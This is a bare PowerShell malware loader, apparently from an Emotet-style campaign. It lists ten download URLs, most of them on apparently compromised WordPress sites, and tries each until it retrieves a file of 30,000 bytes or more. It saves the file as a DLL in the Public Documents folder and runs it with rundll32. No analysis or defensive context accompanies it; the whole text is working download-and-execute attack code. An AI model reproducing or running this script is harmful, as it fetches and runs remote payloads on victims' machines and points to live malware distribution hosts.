$path = "C:\Users\Public\Documents\ssd.dll";
$url1 = 'http://dopevision.tn/wp-admin/SiXj7Yc9QQrTa/';
$url2 = 'https://ss100feet.com/b/t681UHJz/';
$url3 = 'https://directorio.reservado.com.bo/bullyrag/C/';
$url4 = 'https://www.top-art.co.il/wp-content/C0cYUe7Ue/';
$url5 = 'http://www.ufficiomodernosas.it/old/IzGP8VipCQxWMDuum/';
$url6 = 'http://iwannago.dev.bizapps.sg/axedi/gtlf2pXOavEAOR/';
$url7 = 'https://bilisimhocasi.com/wp-admin/DH/';
$url8 = 'https://lufficiodeiviaggi.it/wp-admin/PyzVv79OvIKzqf/';
$url9 = 'https://kleenskinstudio.com/wp-admin/gbzInh4is4/';
$url10 = 'https://www.cam-at.com/wp-admin/vIg9etw5i3jRou/';

$web = New-Object net.webclient;
$urls = "$url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$url9,$url10".split(",");
foreach ($url in $urls) {
   try {
       $web.DownloadFile($url, $path);
       if ((Get-Item $path).Length -ge 30000) {
           [Diagnostics.Process];
           break;
       }
   }
   catch{}
} 
Sleep -s 4;cmd /c C:\Windows\SysWow64\rundll32.exe 'C:\Users\Public\Documents\ssd.dll',AnyString;
